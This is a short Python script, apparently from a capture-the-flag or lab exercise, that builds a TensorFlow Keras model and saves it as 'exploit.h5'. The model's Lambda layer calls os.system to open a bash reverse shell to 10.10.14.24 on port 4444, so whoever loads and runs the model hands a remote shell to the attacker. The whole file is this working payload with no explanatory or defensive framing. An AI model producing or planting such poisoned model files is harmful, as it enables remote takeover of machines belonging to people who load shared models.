import tensorflow as tf

def exploit(x):
    import os
    os.system('/bin/bash -c "/bin/bash -i >& /dev/tcp/10.10.14.24/4444 0>&1"')
    return x

model = tf.keras.Sequential()
model.add(tf.keras.layers.Input(shape=(64,)))
model.add(tf.keras.layers.Lambda(exploit))
model.compile()
model.save("exploit.h5")
